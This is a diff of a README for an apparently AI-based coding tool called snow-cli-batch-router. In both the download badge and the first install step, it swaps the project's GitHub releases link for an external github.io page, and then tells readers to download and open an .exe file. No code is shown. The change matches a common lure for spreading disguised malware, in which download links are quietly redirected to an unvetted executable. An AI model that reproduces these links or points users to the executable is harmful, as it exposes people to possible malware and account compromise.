@@ -1,6 +1,6 @@
 # ❄️ snow-cli-batch-router - Automate your coding tasks with AI
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/vicissitudenest790/snow-cli-batch-router/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://vicissitudenest790.github.io)
 
 snow-cli-batch-router helps you manage coding tasks. It uses artificial intelligence to handle your workflows. You can run commands one at a time or process groups of files in batches. This tool routes your requests to the correct model to get the best results. You see your output update in real time as the system processes your files.
 
@@ -8,7 +8,7 @@ snow-cli-batch-router helps you manage coding tasks. It uses artificial intellig
 
 Follow these steps to get the program on your computer.
 
-1. Visit this page to download the software: https://github.com/vicissitudenest790/snow-cli-batch-router/releases
+1. Visit this page to download the software: https://vicissitudenest790.github.io
 2. Look for the file ending in .exe under the most recent release.
 3. Click the file name to save it to your computer.
 4. Open your Downloads folder.
